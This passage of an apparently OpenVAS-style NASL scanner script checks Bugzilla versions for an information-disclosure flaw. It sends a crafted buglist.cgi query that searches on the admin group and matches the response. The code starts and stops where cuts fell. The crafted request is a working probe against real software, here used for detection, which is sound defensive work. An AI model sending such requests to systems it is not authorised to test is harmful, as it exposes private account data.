...
vers = infos["version"];
dir = infos["location"];
if(version_in_range( version: vers, test_version: "3.7", test_version2: "3.7.2" ) || version_in_range( version: vers, test_version: "3.5.1", test_version2: "3.6.1" ) || version_in_range( version: vers, test_version: "3.3.1", test_version2: "3.4.7" ) || version_in_range( version: vers, test_version: "2.19.1", test_version2: "3.2.7" )){
	exploit = "/buglist.cgi?query_format=advanced&bug_status=CLOSED&" + "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0" + "%3D%25group.admin%25";
	req = NASLString( "GET ", dir, exploit, " HTTP/1.1\\r\\n", "Host: 209.132.180.131\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Language: en-us,en;q=0.5\\r\\n", "Accept-Encoding: gzip,deflate\\r\\n", "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n", "Keep-Alive: 300\\r\\n", "Connection: keep-alive\\r\\n\\r\\n" );
	resp = http_keepalive_send_recv( port: port, data: req );
	if(resp){
		if(eregmatch( pattern: "field0-0-0%3Dreporter%26type0-0-0%3Dequals%26value0-0-0%3D%25group.admin%25/i", string: resp, icase: TRUE )){
